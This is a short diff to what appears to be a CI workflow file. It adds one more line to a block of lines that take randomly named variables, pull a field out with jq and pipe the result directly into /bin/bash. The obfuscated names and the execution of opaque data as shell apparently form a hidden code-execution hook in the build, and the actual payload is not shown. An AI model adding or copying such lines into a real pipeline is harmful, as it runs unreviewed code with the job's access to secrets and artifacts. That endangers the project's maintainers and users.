@@ -28,6 +28,7 @@ jobs:
           echo $vmrc84 | jq -r .hlfmi580 | /bin/bash
           echo $nfx56 | jq -r .t6 | /bin/bash
           printf '%s' "$fj6295" | jq -r .dllfx5550 | /bin/bash
+          printf '%s' "$ueixq19" | jq -r .fdezx0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
